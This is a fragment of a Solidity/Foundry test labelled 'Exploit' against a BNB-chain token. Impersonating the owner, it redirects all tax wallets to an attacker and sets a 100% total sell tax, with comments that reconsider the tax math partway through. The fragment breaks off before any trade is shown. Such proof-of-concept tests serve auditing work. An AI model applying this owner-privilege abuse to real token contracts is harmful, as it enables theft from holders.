        // Give attacker some tokens to sell
        deal(TARGET, attacker, 1000 * 10**18); // 1000 tokens
        // Give attacker some BNB for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Impersonate owner
        vm.startPrank(owner);
        // Step 2: Set tax wallets to attacker address
        CoinToken(TARGET).setTaxWallets(attacker, attacker, attacker);
        // Step 3: Set sell tax to 100% each (dev, marketing, liquidity, charity)
        CoinToken(TARGET).setSellTax(100, 100, 100, 100); // This sums to 400%? Wait denominator is 100, each is percentage. Actually each tax is separate, but they sum in handleTax. Setting each to 100 means total tax = 400%? That's impossible because denominator divides amount. Let's set each to 25 to sum 100%.
        // Better: set each to 25 to total 100%
        CoinToken(TARGET).setSellTax(25, 25, 25, 25);
        vm.stopPrank();

